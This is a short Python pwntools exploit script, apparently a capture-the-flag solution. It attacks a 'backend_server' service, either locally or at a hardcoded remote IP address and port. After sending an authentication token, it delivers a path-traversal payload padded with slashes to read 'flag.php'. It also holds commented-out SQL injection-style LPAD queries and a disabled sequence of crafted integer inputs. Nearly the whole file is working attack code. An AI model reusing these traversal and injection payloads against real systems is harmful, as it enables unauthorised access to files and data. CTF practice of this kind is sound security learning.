#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
from parse import *
from run import exe_mysql

context.log_level="debug"
pwn_file="./backend_server"
elf=ELF(pwn_file)

leak_add=0x605050

if len(sys.argv)==1:
    r=process("./backend_server")
    token="def3fb1762920d470962150f3a2b3af1e676bd59f52de4b2b927ed0252d61475"
    pid=0
else:
    r=remote("178.128.26.72",9997)
  #  sql="SELECT LPAD('PP`',~id%4*1025+394,1) FROM users LIMIT 8,3"
#     sql="SELECT DISTINCT LPAD('PP`',~id%4*1025+395,1) FROM users"
   # sql="select id from users limit 0,3"
    #sql="SELECT LPAD('PP`',id%3*1025+1419,1)FROM users"
    sql=args["SQL"]
    token="eb924ea2375a71acdd853d04cd299d565e30d42f6bf6abc7da89317aa0a434f8"
    #token=exe_mysql(sql)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

def train(x,y,p,q):
    r.sendlineafter("x> ",str(x&0xffffffff))
    r.sendlineafter("y> ",str(y))
    r.sendlineafter("power> ",str(p))
    r.sendlineafter("height",str(q))

r.sendafter(">",token)
debug()
files="Lobhhh/../../"+"flag.php".rjust(0x100-34,'/')
r.sendlineafter(">",files)
r.interactive()
"""
def warmup():
    while True:
        data=r.recvline()
        if "READY" in data:
            p=parse("READY = {:d}%\n",data)[0]
            if p >=100:
                break
            else:
                r.sendlineafter("> ","2")

warmup()
train(1,1,1,1)
train(-0xc4d+0x1f,5,60,90) # now name
train(3,3,3,3)
warmup()
#train(1,1,1,1)
#train(1,1,1,1)
#train(1,1,1,1)
r.interactive()
"""
